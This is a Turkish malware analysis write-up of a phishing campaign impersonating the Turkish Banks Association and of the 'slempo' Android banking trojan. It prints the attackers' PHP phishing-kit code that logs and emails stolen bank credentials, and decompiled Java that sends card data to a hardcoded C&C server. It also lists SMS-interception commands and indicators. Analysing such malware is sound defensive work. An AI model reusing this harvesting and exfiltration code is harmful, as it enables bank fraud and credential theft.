# bankalarbirligi Mobil Zararlı Yazılımı (slempo android bot)

Online banka uygulamalarını hedef alan zararlı yazılımlar her geçen gün artmakta ve farklı atak vektörleri ile karşımıza çıkmaktadır.

Geçtiğimiz ay içerisinde birden fazla zararlı yazılım, farklı kaynaklardan, farklı banka müşterilerini ve online finansal işlemleri kullanan kişileri hedef aldı. Bunlardan ilki  bankalarbirligi.com üzerinden çeşitli banka müşterilerine gönderilen oltalama maili ile ön plana çıktı.

İlk olarak 2011 yılının mart ayında çıkan ve kredi kartı bilgilerini çalmak üzere oluşturulmuş bir web uygulaması olarak karşımıza çıkan bu domain şimdilerde hem web hem de mobil uygulama olarak karşımıza çıkmaktadır.

![enter image description here](https://i.imgur.com/NpOhiOQ.png)

Farklı alan adları ile kurbanlarına ulaşmaya çalışan saldırganlar

| Alan Adı |   
|:--------|
|@bankalarbirligi.com|
|@onlinebankalarbirligi.co.uk|
|@bankalarbirligimail.co.uk|
|@renatea.gob.ar|
|@bildirimbankalarbirligi.co.uk|

alan adlarından kullanıcılara gönderikleri e-posta göndermekte ve postanın içeriğinde Türk Bankalar Birliği'nin güncelleme adı altında kullanıcılardan ilgili bankadaki hesap bilgilerini girmesini talep etmektedir 

![enter image description here](https://i.imgur.com/01r5jz1.png)

>TBB’ye (Bankalar Birliği) bağlı tüm bankaların SSL yazılımları ve internet bankacılığına hizmet eden bilgisayarlar ve akıllı telefonlar güncellenmektedir 

Gibi bir bilgi sunmakta ve ilgili bankalara ait müşterilerin bilgilerinin güncellenmesi gerektiğini söylemektedir. 5 farklı banka için hazırlanmış içeriğe ulaştığınız zaman ilgili bankanın online bankacılık uygulamasının birebir kopyası içerik karşınıza çıkmaktadır:

![enter image description here](https://i.imgur.com/Q6n2VhQ.png)

![enter image description here](https://i.imgur.com/diSvEEK.png)

![enter image description here](https://i.imgur.com/sRYCADh.png)


![enter image description here](https://i.imgur.com/BoSMopH.png)

![enter image description here](https://i.imgur.com/nWnDOmo.png)

Saldırgan kurbanlarından ilgili bilgileri girmesini talep edip bu bilgileri ileriki safhalarda kullanmak üzere saklamaktadır.

İlgili alan adı incelendiğinde oltalama için aynı IP adresine ait birden fazla domain ve farklı sanal sunucu bilgileri ile ön plana çıkmaktadır.

| Alan Adı | IP Adresi      |
|:--------| -------------:|
|.bankalarbirligi.com. 								|		162.221.176.52|
|.www.bankalarbirligi.com. 							|		162.221.176.52|
|.dns1.auth-mail.ru. 										|	162.221.176.52 |
|.dns2.auth-mail.ru. 										|	162.221.176.52 |
|.dns2.555mir.ru. 											|162.221.176.52 	|
|.support.apple.com.en-gb.confirm.id.auth.cgi-key.myapple-unlock.web.user.eu-web0-ssl.com.| 	162.221.176.52|
|.verification-id-unlock-web0-ssl.com. 				|		162.221.176.52|
|.dns1.555mir.ru. 										|	162.221.176.52 |
|.eu-web0-ssl.com. 									|		162.221.176.52|
|.american-express-r3ura.com. 						|		162.221.176.52|
|.www.american-express-r3bri.com. 					|		162.221.176.52|
|.www.american-express-r3ura.com. 					|		162.221.176.52|
|.american-express-r3mne.com. 						|		162.221.176.52|
|.american-express-r3gro.com. 						|		162.221.176.52|
|.american-express-r3bri.com. 						|		162.221.176.52|

Saldırıyı gerçekleştirmek isteyenler, hem yurt içinde hem de yurt dışında birçok kişiyi hedef almakta ve geniş çaplı bir oltalama kampanyalardan birisini yönettiği sonucuna varılabilmektedir.


Müşteri ilgili bankadaki kendi hesap bilgilerini girdiği vakit cep telefonuna gönderilen doğrulama kodunu (**OTP**) alabilmek için yine **android** telefonlar için tasarlanmış mobil uygulamayı müşteriye indirtmek istemektedir.

![enter image description here](https://i.imgur.com/I8oCxBp.png)


Saldırgan zararlı yazılıma **E-Şifre Güvenlik** adı verdiği uygulamayı bu anda indirtmektedir.

Saldırgan her bir banka icin hazırladığı  oltalama web sitesinin arka tarafında *PHP* ile hazırlanmış bir uygulama sunmaktadır.
Sunucu üzerinde çalışan

- *control.php*
- *download.php*
- *indir.php*
- *index.php*

kodların içerikleri aşağıdaki gibidir.

```php
<?php
include "../../control.php";
if(isset($_POST["user"]))
{
	$user=$_POST["user"];
	$pass=$_POST["pass"];
	$mob=$_POST["mob"];
	$email=$_POST["email"];
	$type=$_POST["type"];
	$android=0;
	$desktop=0;
	if(strlen($user) < 3 || strlen($pass) < 6 ||  strlen($mob) < 3)
	{
		echo "<script>
window.location.assign(\"index.php?errorID=".rand(10000,999999999).rand(10000,999999999)."&authError=1\");</script>";
die();
}

if($type == "android")
{
	$android=1;
}
else
{
	$desktop=1;
}


$ip=$_SERVER["REMOTE_ADDR"];
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$hostname=gethostbyaddr($ip);
$agent=$_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {
      $oip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $oip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $oip="same";
    }
$details="====================\r\n

User = $user \n
Pass = $pass \n
Mobile = $mob \n
Email = $email \n
Type = $type \n
Bank = $bankname\n
IP = $ip   HostName= $hostname\n
Original IP = $oip \n
User-Agent= $agent \n
Time = $time \n
Date = $date \n
====================\r\n";
if($log_feature==1)
{
	$file=fopen("../../".$logfile,"a");
	fwrite($file,$details);
	fclose($file);
}
if($email_feature==1)
{
	mail($send,"$bankname log  $ip",$details);
}
}
else
{
	echo '<script>window.location.assign("http://www.google.com")</script>';
	die();
}
?>
```

Saldırgan kullanıcıdan almış olduğu hassas verilerden:

 - User 
 - Pass 
 - Email 
 - Bank
 - Mobile
 - IP
 - User-Agent
 - Type
 - Time & Date

gibi veriler kendi sunucusu üzerindeki **log.txt** dosyasına yazmaktadır. Böylece kullanıcılara ait parola, hesap numarası gibi bilgileri kaydetmektedir.

Kurban **android** cihazdan bağlandığı durumlarda ise  *download.php* sayfasına yönlendirilmekte ve android uygulamasını indirtmektedir. Aksi durumlarda ise  kurbanı doğrudan Türk Bankalar Birliğinin ana sayfasına (tbb.org.tr'ye) yönlendirmektedir.

```php
<?php
if($android == 1)
{
echo '
	<script>
	setTimeout(function(){ 
	window.location.assign("../../download.php?client-ID=050541574d65fs9864698g4d6984867986494");
redirect(); }, 3000);
	setTimeout(function(){ 
	window.location.assign("https://www.tbb.org.tr");
	 }, 10000);
	</script>
';
}
else
{
echo '
	<script>
	setTimeout(function(){ 
	window.location.assign("https://www.tbb.org.tr");
	 }, 7000);
	</script>';
}

```

*download.php* dosyası PHP kodlarında ise ilgili zararlı yazılım indirilmekte ya da youtube mobil sitesine yönlendirildiği belirtir kod parçası.

```php
<?php
//error_reporting(0);
include "control.php";
if(isset($_GET["client-ID"]))
{

$file="downloads/".$ratname;
 header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
else
{
echo '<script>window.location.assign("http://m.youtube.com")</script>';
}
?>
```

Saldırganın oltalama için kullandığı sunucu üzerinde tuttuğu bir diğer dosya *control.php*  dosyası içeriğinde ise  genel tanımlamalar bulunmaktadır.

```php
<?php

$send="Your email here";
$ratname="AdobeFlashPlayer.apk";
$logfile="logs.txt";

$email_feature=1;  // feature On (1) and off (0) toggle
$log_feature=1;  // feature On (1) and off (0) toggle
?>
```

Görüldüğü gibi sistemde web ortamından kurbana ait hesap bilgileri toplanırken arka diğer tarafta android telefonlar vasıtasıyla **OTP** mesaj bilgisi elde etmeye yönelik zararlı yazılımı cihaza yükletilmek istenmektedir..

indirilen **AdobeFlashPlayer.apk** mobil zararlı yazılımı ise aşağıda belirtilen işlemleri gerçekleştirmektedir.

![enter image description here](https://i.imgur.com/KIqGprP.png)


Uygulamanın istediği izinleri kontrol ettiğimiz zaman şu şekilde bir tablo ile karşı karşıya kalmaktayız

![enter image description here](https://i.imgur.com/hdntub7.png)

Uygulamanın kaynak kodlarına erişmek için apk dosyası decompile işleminden geçirilerek daha ayrıntılı verilere ulaşılabilmektedir. bu işlem için [jd-gui](http://jd.benow.ca/), [APK2Java](http://www.apk2java.com/) vb. apk dosyalarından java kaynak koda erişmeye izin veren araçlar kullanılabilir.

**slempo** paket ismini kullanan daha önceki android zararlı yazılım TOR ağını kullanarak C&C ile iletişime geçerken 

![enter image description here](https://i.imgur.com/9ZFCePn.png)

![enter image description here](https://i.imgur.com/EwBs0qB.png)


![enter image description here](https://i.imgur.com/OmaJcJk.png)


tbb adına yayılan **AdobeFlashPlayer** ise standart HTTP protokolünü kullanmaktadır. Zararlı yazılıma ait bazı bulguları irdelersek.


**960422d069c5bcf14b2acbefac99b4c57b857e2a2da199c69e4526e0defc14d7** hash değerine sahip zararlı yazılıma ait [virustotal analizi](https://www.virustotal.com/en/file/960422d069c5bcf14b2acbefac99b4c57b857e2a2da199c69e4526e0defc14d7/analysis/) gibidir.

Uygulama decompile işleminden geçirilip kaynak kodlar incelendiğinde bazı bilgiler ön plana çıkmaktadır.

```java
org.slempo.service.Main
org.slempo.service.DeviceAdminChecker
org.slempo.service.activities.Cards
org.slempo.service.activities.CvcPopup
org.slempo.service.activities.ChangeNumber
org.slempo.service.activities.Commbank
org.slempo.service.activities.Nab
org.slempo.service.activities.Westpack
org.slempo.service.activities.StGeorge
org.slempo.service.activities.GM
org.slempo.service.activities.HTMLDialogs
org.slempo.service.activities.CommonHTML 
``` 



*Constants.java*

```java
package org.slempo.service;
 
public class Constants
{
  public static final String ADMIN_URL = "http://37.143.14.251:2080/";
  public static final String ADMIN_URL_HTML = "http://37.143.14.251:2080/forms/";
  public static final String APP_ID = "APP_ID";
  public static final String APP_MODE = "3";
  public static final int ASK_SERVER_TIME_MINUTES = 1;
  public static final String BLOCKED_NUMBERS = "BLOCKED_NUMBERS";
  public static final String CLIENT_NUMBER = "2";
  public static final String CODE_IS_SENT = "CODE_IS_SENT";
  public static final String COMMBANK_IS_SENT = "COMMBANK_IS_SENT";
  public static final String CONTROL_NUMBER = "CONTROL_NUMBER";
  public static final String DEBUG_TAG = "DEBUGGING";
  public static final boolean ENABLE_GPS = true;
  public static final String GM_IS_SENT = "GM_IS_SENT";
  public static final String HTML_DATA = "HTML_DATA";
  public static final String HTML_VERSION = "HTML_VERSION";
  public static final String INTERCEPTED_NUMBERS = "INTERCEPTED_NUMBERS";
  public static final String INTERCEPTING_INCOMING_ENABLED = "INTERCEPTING_INCOMING_ENABLED";
  public static final String IS_LINK_OPENED = "IS_LINK_OPENED";
  public static final String IS_LOCK_ENABLED = "IS_LOCK_ENABLED";
  public static final int LAUNCH_CARD_DIALOG_WAIT_MINUTES = 1;
  public static final String LINK_TO_OPEN = "http://xxxmobiletubez.com/video.php";
  public static final String LISTENING_SMS_ENABLED = "LISTENING_SMS_ENABLED";
  public static final int MESSAGES_CHUNK_SIZE = 1000;
  public static final String MESSAGES_DB = "MESSAGES_DB";
  public static final String NAB_IS_SENT = "NAB_IS_SENT";
  public static final String PHONE_IS_SENT = "PHONE_IS_SENT";
  public static final String PREFS_NAME = "AppPrefs";
  public static final String ST_JEORGE_IS_SENT = "ST_JEORGE_IS_SENT";
  public static final String WESTPACK_IS_SENT = "WESTPACK_IS_SENT";
   
  public Constants() {}
}
```
dikkat edileceği üzere sabit değişkenlerin bulunduğu dosya içerisinde **IP** adresleri ve bazı URL bilgileri bulunmaktadır.  zararlının iletişime geçtiğ CnC sunucu bilgisi

```java
    CreditCardNumberEditText$OnCreditCardTypeChangedListener
```
sınıfında *sendData* ile **37.143.14.251** IP adresi **2080** portuna veri gönderdiği görülmektedir.

```java
    private void sendData() {
        Sender.sendCardData((Context)this, "http://37.143.14.251:2080/", new Card(this.ccBox.getText().toString(), this.expiration1st.getText().toString(), this.expiration2nd.getText().toString(), this.cvcBox.getText().toString()), new BillingAddress(this.nameOnCard.getText().toString(), this.dateOfBirth.getText().toString(), this.zipCode.getText().toString(), this.streetAddress.getText().toString(), "+" + this.countryPrefix.getText().toString() + this.phoneNumber.getText().toString()), new AdditionalInformation(this.vbvPass.getText().toString(), this.oldVbvPass));
    }
```

Zararlı uygulamanın cihaz tarafında yaptığı diğer işlemlere bakarsak:
Zararlı mobil cihazı ilklendirirken  cihaza ait çeşitli verileri C&C sunucuya göndermekte ve bu verilere göre enfekte olmuş cihaz için bir ID(code) almaktadır.

![enter image description here](https://i.imgur.com/xcsHObE.png)

![enter image description here](https://i.imgur.com/vLSUjGc.png)

zararlı belirli aralıklarla (her bir dakikada bir) C&C sunucuna bağlanıp yeni komut beklemektedir.


```

I/InputDispatcher(  511): Dropping event because there is no touchable window at (778, 972).
I/ActivityManager(  511): START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=com.android.vending/.AssetBrowserActivity} from pid 690
W/genymotion_audio(  148): out_write() limiting sleep time 111337 to 39909
W/genymotion_audio(  148): out_write() limiting sleep time 102879 to 39909
W/genymotion_audio(  148): out_write() limiting sleep time 94467 to 39909
D/dalvikvm(  511): GC_FOR_ALLOC freed 1660K, 23% free 10811K/13872K, paused 8ms, total 8ms
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
W/genymotion_audio(  148): out_write() limiting sleep time 76575 to 39909
I/ActivityManager(  511): Start proc com.android.vending for activity com.android.vending/.AssetBrowserActivity: pid=2710 uid=10078 gids={50078, 3003, 1028, 1015}
W/genymotion_audio(  148): out_write() limiting sleep time 68163 to 39909
D/Finsky  ( 2710): [1] FinskyApp.onCreate: Initializing network with DFE https://android.clients.google.com/fdfe/
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
D/dalvikvm( 2710): GC_CONCURRENT freed 217K, 8% free 3186K/3456K, paused 2ms+0ms, total 5ms
W/genymotion_audio(  148): out_write() limiting sleep time 50272 to 39909
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
D/dalvikvm( 2710): GC_CONCURRENT freed 297K, 10% free 3289K/3636K, paused 2ms+2ms, total 5ms
D/Finsky  ( 2710): [1] DailyHygiene.goMakeHygieneIfDirty: No need to run daily hygiene.
W/Settings( 2710): Setting download_manager_max_bytes_over_mobile has moved from android.provider.Settings.Secure to android.provider.Settings.Global.
W/Settings( 2710): Setting download_manager_recommended_max_bytes_over_mobile has moved from android.provider.Settings.Secure to android.provider.Settings.Global.
W/genymotion_audio(  148): out_write() limiting sleep time 41836 to 39909
D/dalvikvm( 2710): GC_CONCURRENT freed 181K, 7% free 3606K/3840K, paused 1ms+1ms, total 5ms
D/dalvikvm( 2710): GC_FOR_ALLOC freed 26K, 7% free 3757K/4004K, paused 2ms, total 2ms
I/dalvikvm-heap( 2710): Grow heap (frag case) to 4.791MB for 1127532-byte allocation
D/dalvikvm( 2710): GC_FOR_ALLOC freed <1K, 5% free 4857K/5108K, paused 1ms, total 1ms
D/dalvikvm( 2710): GC_CONCURRENT freed <1K, 5% free 4857K/5108K, paused 0ms+0ms, total 2ms
D/Finsky  ( 2710): [1] 2.run: Loaded library for account: [82l_nLYaM8KCGZY41jomHcAuIvo]
D/Finsky  ( 2710): [1] 2.run: Finished loading 1 libraries.
D/Finsky  ( 2710): [1] GmsCoreHelper.cleanupNlp: result=false type=4
D/Finsky  ( 2710): [1] SelfUpdateScheduler.checkForSelfUpdate: Skipping DFE self-update. Local Version [80260017] >= Server Version [-1]
D/libEGL  ( 2710): loaded /system/lib/egl/libEGL_genymotion.so
D/        ( 2710): HostConnection::get() New Host Connection established 0xb7b88670, tid 2710
D/libEGL  ( 2710): loaded /system/lib/egl/libGLESv1_CM_genymotion.so
D/libEGL  ( 2710): loaded /system/lib/egl/libGLESv2_genymotion.so
W/EGL_genymotion( 2710): eglSurfaceAttrib not implemented
E/OpenGLRenderer( 2710): Getting MAX_TEXTURE_SIZE from GradienCache
E/OpenGLRenderer( 2710): MAX_TEXTURE_SIZE: 16384
E/OpenGLRenderer( 2710): Getting MAX_TEXTURE_SIZE from Caches::initConstraints()
E/OpenGLRenderer( 2710): MAX_TEXTURE_SIZE: 16384
D/OpenGLRenderer( 2710): Enabling debug mode 0
D/dalvikvm( 2710): GC_CONCURRENT freed 355K, 8% free 5008K/5416K, paused 0ms+1ms, total 4ms
D/Finsky  ( 2710): [1] UpdateWidgetsReceiver.onReceive: Updated 0 MarketWidgetProvider widgets (com.google.android.finsky.action.TOC_SET)
D/Finsky  ( 2710): [1] UpdateWidgetsReceiver.onReceive: Updated 0 RecommendedWidgetProvider widgets (com.google.android.finsky.action.TOC_SET)
D/Finsky  ( 2710): [1] UpdateWidgetsReceiver.onReceive: Updated 0 NowPlayingWidgetProvider widgets (com.google.android.finsky.action.TOC_SET)
D/Finsky  ( 2710): [1] RestoreTracker.stopServiceIfDone: Restore complete with 0 success and 0 failed.
D/dalvikvm( 2710): GC_CONCURRENT freed 287K, 6% free 5337K/5672K, paused 0ms+0ms, total 5ms
I/ActivityManager(  511): Displayed com.android.vending/.AssetBrowserActivity: +471ms
D/Finsky  ( 2710): [1] MainActivity.initializeBilling: Optimistically initializing billing parameters.
D/Finsky  ( 2710): [1] BaseWidgetProvider.onReceive: Received ACTION_APPWIDGET_UPDATE, updating 0 widgets.
D/Finsky  ( 2710): [1] BaseWidgetProvider.onReceive: Received ACTION_APPWIDGET_UPDATE, updating 0 widgets.
D/Finsky  ( 2710): [1] BaseWidgetProvider.onReceive: Received ACTION_APPWIDGET_UPDATE, updating 0 widgets.
D/dalvikvm( 2710): GC_CONCURRENT freed 376K, 8% free 5626K/6052K, paused 2ms+0ms, total 5ms
D/dalvikvm( 2710): GC_CONCURRENT freed 205K, 4% free 6229K/6484K, paused 3ms+1ms, total 8ms
D/dalvikvm( 2710): GC_EXPLICIT freed 225K, 4% free 6998K/7276K, paused 2ms+1ms, total 8ms
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)

``` 

gibi log satirlari düşerken 

```
D/dalvikvm( 2683): GC_CONCURRENT freed 167K, 6% free 3640K/3856K, paused 1ms+0ms, total 4ms
I/ActivityManager(  511): START u0 {flg=0x10020000 cmp=org.slempo.service/.activities.Cards} from pid 2683
D/        (  511): HostConnection::get() New Host Connection established 0xb7a504a8, tid 672
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
D/dalvikvm( 2683): GC_FOR_ALLOC freed 11K, 6% free 3813K/4020K, paused 1ms, total 1ms
I/dalvikvm-heap( 2683): Grow heap (frag case) to 4.845MB for 1127532-byte allocation
D/dalvikvm( 2683): GC_FOR_ALLOC freed <1K, 5% free 4914K/5124K, paused 1ms, total 1ms
D/dalvikvm( 2683): GC_CONCURRENT freed <1K, 5% free 4914K/5124K, paused 0ms+1ms, total 2ms
D/libEGL  ( 2683): loaded /system/lib/egl/libEGL_genymotion.so
D/        ( 2683): HostConnection::get() New Host Connection established 0xb7ba86e0, tid 2683
D/libEGL  ( 2683): loaded /system/lib/egl/libGLESv1_CM_genymotion.so
D/libEGL  ( 2683): loaded /system/lib/egl/libGLESv2_genymotion.so
W/EGL_genymotion( 2683): eglSurfaceAttrib not implemented
E/OpenGLRenderer( 2683): Getting MAX_TEXTURE_SIZE from GradienCache
E/OpenGLRenderer( 2683): MAX_TEXTURE_SIZE: 16384
E/OpenGLRenderer( 2683): Getting MAX_TEXTURE_SIZE from Caches::initConstraints()
E/OpenGLRenderer( 2683): MAX_TEXTURE_SIZE: 16384
D/OpenGLRenderer( 2683): Enabling debug mode 0
D/dalvikvm( 2683): GC_CONCURRENT freed 121K, 4% free 5302K/5476K, paused 0ms+0ms, total 2ms
I/ActivityManager(  511): Displayed org.slempo.service/.activities.Cards: +390ms
D/Finsky  ( 2710): [1] CarrierParamsAction.createCarrierBillingParameters: Carrier billing config is null. Device is not targeted for DCB 2.
E/Finsky  ( 2710): [235] FileBasedKeyValueStore.delete: Attempt to delete 'params69dzFR3t8LGNQGIyh8Kkfw' failed!
D/Finsky  ( 2710): [1] GetBillingCountriesAction.run: Skip getting fresh list of billing countries.
D/dalvikvm(  675): GC_CONCURRENT freed 460K, 16% free 3574K/4236K, paused 0ms+1ms, total 3ms
D/dalvikvm(  511): GC_CONCURRENT freed 1079K, 17% free 11565K/13872K, paused 1ms+1ms, total 14ms
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
D/dalvikvm(  511): GC_FOR_ALLOC freed 1204K, 18% free 11413K/13868K, paused 11ms, total 11ms
W/genymotion_audio(  148): out_write() limiting sleep time 100839 to 39909
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
I/ActivityManager(  511): START u0 {act=com.android.systemui.recent.action.TOGGLE_RECENTS flg=0x10800000 cmp=com.android.systemui/.recent.RecentsActivity (has extras)} from pid 570
D/dalvikvm(  511): GC_FOR_ALLOC freed 800K, 18% free 11407K/13868K, paused 7ms, total 7ms
W/genymotion_audio(  148): out_write() limiting sleep time 92380 to 39909
W/EGL_genymotion(  570): eglSurfaceAttrib not implemented

``` 

şeklinde **slempo** servisi çalışmaya başlamaktadır.

```
I/ActivityManager(  511): Displayed org.slempo.service/.activities.Cards: +390ms


I/ActivityManager(  511): START u0 {flg=0x10020000 cmp=org.slempo.service/.activities.CvcPopup} from pid 2683
``` 

![enter image description here](https://i.imgur.com/jQkzF6V.png)


![enter image description here](https://i.imgur.com/EL552jA.png)


![enter image description here](https://i.imgur.com/q9zy9dC.png)



![enter image description here](https://i.imgur.com/lKkJ2yV.png)



![enter image description here](https://i.imgur.com/uZJhWGA.png)


dikkat edilirse **screen injection** yöntemi kullanılarak asıl uygulamanın sormadığı fakat zararlı yazılımın elde etmek istediği bilgileri C&C sunucusuna gönderilmektedir.

Yine aynı şekilde kullanıcı gmail'i açtığı zaman

```
I/ActivityManager(  511): START u0 {flg=0x10020000 cmp=org.slempo.service/.activities.GM} from pid 5876
I/ActivityManager(  511): Displayed org.slempo.service/.activities.GM: +151ms
I/ActivityManager(  511): START u0 {flg=0x10124000 cmp=org.slempo.service/.activities.GM} from pid 570
I/ActivityManager(  511): Displayed org.slempo.service/.activities.GM: +68ms
I/ActivityManager(  511): Killing 5876:org.slempo.service/u0a58 (adj 16): remove task
I/WindowState(  511): WIN DEATH: Window{52ad13b4 u0 org.slempo.service}

``` 
![enter image description here](https://i.imgur.com/Kq8hICR.png)

![enter image description here](https://i.imgur.com/2ugtc4j.png)

gmail kullanıcı adı ve parolasını da ele geçirmek için açılır pencere vasıtasıyla bilgileri ele geçirmeye çalışmaktadır.

Zararlının C&C sunucusuna gönderdiği verilerin bulunduğu sınıflar

- sendAccountData
- sendAppCodeData
- sendBillingData
- sendCallsForwarded
- sendCallsForwardingDisabled
- sendCardData
- sendCheckData
- sendControlNumberData
- sendFormsData
- sendGPSData
- sendHTMLUpdated
- sendInitialData
- sendInstalledApps
- sendInterceptedIncomingSMS
- sendListenedIncomingSMS
- sendListenedOutgoingSMS
- sendListeningStatus
- sendLockStatus
- sendNotificationSMSSentData
- sendPhoneData
- sendRentStatus
- sendReport
- sendStGeorgeBillingData
- sendStartBlockingNumbersData
- sendUnblockAllNumbersData

olarak görülmüştür.

Uygulamanın arka planda çalıştırdığı komutların bulunduğu sınıflar ise:

- hasCommand
- processInterceptSMSStartCommand
- processInterceptSMSStopCommand
- processCheckGPSCommand
- processBlockNumbersCommand
- processUnblockAllNumbersCommand
- processUnblockNumbersCommand
- processListenSMSStartCommand
- processListenSMSStopCommand
- processGrabAppsCommand
- processLockCommand
- processUnlockCommand
- processSendMessageCommand
- processSentIDCommand
- processControlNumberCommand
- processCheckCommand
- processShowHTMLCommand
- processForwardCallsCommand
- processDisableForwardCallsCommand
- processUpdateHTMLCommand

şeklindedir.

Uygulamanın kaynak kodlarında yer alan sınıflardan:

![enter image description here](https://i.imgur.com/w0LSSxn.png)

https://www.commbank.com.au/
https://ibanking.stgeorge.com.au/
https://www.nab.com.au/personal/banking/nab-internet-banking
https://www.westpac.com.au/personal-banking/online-banking/features/


gibi siteleri hedef alması zararlının farklı bir kıtayı hedefler iken kurban portföyünü genişletmek adına türk banka müşterilerini de hedef aldığını söyleyebiliriz.

**devam edecek
